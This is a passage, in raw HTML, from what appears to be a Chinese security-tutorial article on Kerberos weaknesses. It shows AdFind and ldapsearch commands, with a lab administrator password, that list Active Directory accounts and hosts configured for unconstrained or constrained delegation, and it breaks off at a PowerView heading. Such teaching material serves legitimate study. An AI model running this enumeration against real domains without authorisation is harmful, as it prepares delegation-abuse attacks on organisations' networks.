style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">attr list</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">参数说明：</p><p style="-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;padding-left: 1em;list-style: circle;"><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>-b：指定要查询的根节点</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>-f：LDAP过滤条件</span><span style="margin: 0.2em 8px;-webkit-tap-highlight-color: transparent;line-height: 1.75;text-indent: -1em;display: block;"><span style="margin-right: 10px;-webkit-tap-highlight-color: transparent;">•</span>attr list：需要显示的属性</span></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置非约束委派的用户：<br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AdFind</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"DC=0day,DC=org"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> cn distinguishedName</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置非约束委派的主机：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AdFind</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"DC=0day,DC=org"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> cn distinguishedName</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.21606864274570983" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/40_RuCFmQiaicbMVwLzhB7tSBqYibRnZQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIwslPJp6OYg5Cl63gLnxlVBJE20KRuCFmQiaicbMVwLzhB7tSBqYibRnZQ/640?wx_fmt=png'" data-type="png" data-w="1282" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.ldapsearch</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />kali自带，可以在域外使用<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置非约束委派的用户：<br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ldapsearch </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">x </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">H ldap</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.200.143:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置非约束委派的主机：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ldapsearch </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">x </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">H ldap</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" |grep -iE "distinguishedName"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7935285053929122" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/41_SnoaHjdCibnkoNHojRVJy2MAXOWjRg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIy27dhvwm21rw90ibjRRZT2rbQlSnoaHjdCibnkoNHojRVJy2MAXOWjRg/640?wx_fmt=png'" data-type="png" data-w="649" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h2 style="margin: 4em auto 2em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(255, 255, 255);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 0.2em;padding-left: 0.2em;background: rgb(15, 76, 129);">筛选约束性委派属性的账号</h2><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">1.ldapsearch</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置约束委派用户:<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ldapsearch </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">x </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">H ldap</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置约束委派的主机：<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ldapsearch </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">x </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">H ldap</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//192.168.200.146:389 -D "CN=administrator,CN=Users,DC=0day,DC=org" -w admin\!\@\#45 -b "DC=0day,DC=org" "(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.7917981072555205" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/42_HXm83Uwnv38dS6Sjwqiaw4tUusFBnw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaISBKC6W7acOrffdr4earrY7xqSHXm83Uwnv38dS6Sjwqiaw4tUusFBnw/640?wx_fmt=png'" data-type="png" data-w="634" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">2.ADFind</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置约束委派用户:<br style="-webkit-tap-highlight-color: transparent;"  /><br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AdFind</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"DC=0day,DC=org"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> cn distinguishedName msds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">allowedtodelegateto</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br style="-webkit-tap-highlight-color: transparent;"  />查找域中配置约束委派的主机：<br style="-webkit-tap-highlight-color: transparent;"  /></p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">AdFind</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">exe </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"DC=0day,DC=org"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">f </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> cn distinguishedName msds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">allowedtodelegateto</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.3557617942768755" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/43_f7rTjtfOEDHV4vYPqCQtJ6Idppv6Dg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIjyibUOEhcsVfUjBvs1VFdnIzNf7rTjtfOEDHV4vYPqCQtJ6Idppv6Dg/640?wx_fmt=png'" data-type="png" data-w="1293" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">3.Empire下的PowerView.ps1脚本</h3><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0); white-space: normal; "><pre data-lang="" 